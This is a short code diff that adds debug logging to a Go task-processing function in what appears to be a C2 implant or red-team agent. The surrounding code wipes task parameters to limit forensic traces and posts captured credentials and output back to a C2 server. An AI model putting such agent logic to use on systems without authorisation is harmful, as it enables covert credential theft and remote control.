@@ -804,6 +804,9 @@ func processTaskWithAgent(task structs.Task, agent *structs.Agent, c2 profiles.P
 	// Zero task parameters to reduce forensic exposure of credentials/arguments
 	task.WipeParams()
 
+	log.Printf("task %s (%s) result: status=%s completed=%t output_len=%d has_creds=%v",
+		task.Command, task.ID, result.Status, result.Completed, len(result.Output), result.Credentials != nil)
+
 	// Send final response
 	response := structs.Response{
 		TaskID:          task.ID,
@@ -814,9 +817,11 @@ func processTaskWithAgent(task structs.Task, agent *structs.Agent, c2 profiles.P
 		Credentials:     result.Credentials,
 		ProcessResponse: result.Output,
 	}
+	log.Printf("task %s PostResponse starting", task.Command)
 	if _, err := c2.PostResponse(response, agent, socksManager.DrainOutbound()); err != nil {
 		log.Printf("send error: %v", err)
 	}
+	log.Printf("task %s PostResponse done", task.Command)
 
 	// Signal the response forwarder to finish and wait for it to drain
 	close(done)
